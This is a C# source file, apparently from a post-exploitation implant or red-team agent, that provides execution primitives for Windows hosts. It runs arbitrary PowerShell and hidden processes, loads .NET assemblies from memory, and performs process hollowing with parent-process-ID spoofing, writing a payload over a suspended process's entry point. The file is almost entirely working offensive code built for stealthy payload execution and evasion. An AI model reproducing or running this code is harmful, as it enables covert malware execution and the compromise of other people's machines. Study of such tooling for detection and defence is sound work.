using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

//Adding libraries for powershell stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Agent.Internal
{
    public static class Execute
    {
        public static string ExecutePowershellScript(byte[] script)
        {
            string scriptString = System.Text.Encoding.UTF8.GetString(script);
            Runspace runspace = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;
            ps.AddScript(scriptString, true);
            runspace.Open();
            //settings.ErrorActionPreference = ActionPreference.Continue;
            Collection<PSObject> results = ps.Invoke();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static string ExecutePowershellCommand(string args)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;
            ps.AddScript(args, true);
            runspace.Open();
            //settings.ErrorActionPreference = ActionPreference.Continue;
            Collection<PSObject> results = ps.Invoke();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static string ExecuteCommand(string fileName,string args)
        {
            var startInfo = new ProcessStartInfo
            {
                
                FileName = fileName,
                Arguments = args,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            var process = Process.Start(startInfo);
            string output = "";
            using (process.StandardOutput)
            {
                output += process.StandardOutput.ReadToEnd();
            }
            using (process.StandardError)
            {
                output += process.StandardError.ReadToEnd();
            }
            return output;
        }

        public static string ExecuteAssemblyUnloadAppDomain(byte[] asm, string[] args = null)
        {
            System.Type activator = typeof(ApplicationProxy);
            AppDomain domain =
                AppDomain.CreateDomain(
                    "SecondaryDomain", null,
                    new AppDomainSetup()
                    {
                    //ApplicationName = $"C:\\Temp\\ShadowCopy",
                    //CachePath = $"C:\\Temp\\ShadowCopy",
                    //ShadowCopyFiles = "true"
                }); ;

            ApplicationProxy proxy =
                domain.CreateInstanceAndUnwrap(
                    Assembly.GetAssembly(activator).FullName,
                    activator.ToString()) as ApplicationProxy;

            var result = proxy.ExecuteInSeperateAppDomain(asm, args);
            AppDomain.Unload(domain);
            return result;
        }


        public static string ExecuteAssembly(byte[] asm,string[] args = null)
        {
            if (args is null)
            {
                args = new string[] { };
            }
            var currentOut = Console.Out;
            var currentError = Console.Error;
            var ms = new MemoryStream();
            var sw = new StreamWriter(ms);
            sw.AutoFlush = true;
            Console.SetOut(sw);
            Console.SetError(sw);
            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { args });
            Console.Out.Flush();
            Console.Error.Flush();
            var output = Encoding.UTF8.GetString(ms.ToArray());
            Console.SetOut(currentOut);
            Console.SetError(currentError);
            sw.Dispose();
            ms.Dispose();
            return output;
        }
        public static bool ExecuteProcessHollow(byte[] payloadBytes, string path, int ppid)
        {

            Native.Kernel32.STARTUPINFO si = new Native.Kernel32.STARTUPINFO();
            Native.Kernel32.STARTUPINFOEX siEx = new Native.Kernel32.STARTUPINFOEX();
            si.cb = Marshal.SizeOf(siEx);
            siEx.StartupInfo = si;
            Native.Kernel32.PROCESS_INFORMATION pi = new Native.Kernel32.PROCESS_INFORMATION();
            //string path = "C:\\windows\\system32\\" + processName;
            // add parent pid
            IntPtr lpAttributeList = Internal.Impersonator.ParentProcessIDSpoof(ppid);
            if (lpAttributeList == IntPtr.Zero)
            {
                return false;
            }
            siEx.lpAttributeList = lpAttributeList;
            bool res = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x08080004, IntPtr.Zero, null, ref siEx, out pi);

            Native.Kernel32.PROCESS_BASIC_INFORMATION bi = new Native.Kernel32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            Native.Kernel32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            Native.Kernel32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            Native.Kernel32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            var decryptedBytes = payloadBytes;
            // Perform Decrypt heres
            Native.Kernel32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
            Native.Kernel32.ResumeThread(pi.hThread);
            return true;
        }
        //create process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           IntPtr lpProcessAttributes,
           IntPtr lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref Native.Kernel32.STARTUPINFOEX lpStartupInfo,
           out Native.Kernel32.PROCESS_INFORMATION lpProcessInformation);
    }

    
    class ApplicationProxy : MarshalByRefObject
    {
        public string ExecuteInSeperateAppDomain(byte[] asm,string[] args)
        {
            if (args is null)
            {
                args = new string[] { };
            }
            var currentOut = Console.Out;
            var currentError = Console.Error;
            var ms = new MemoryStream();
            var sw = new StreamWriter(ms);
            sw.AutoFlush = true;
            Console.SetOut(sw);
            Console.SetError(sw);
            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { args });
            Console.Out.Flush();
            Console.Error.Flush();
            var output = Encoding.UTF8.GetString(ms.ToArray());
            Console.SetOut(currentOut);
            Console.SetError(currentError);
            sw.Dispose();
            ms.Dispose();
            return output;
        }
    }
}
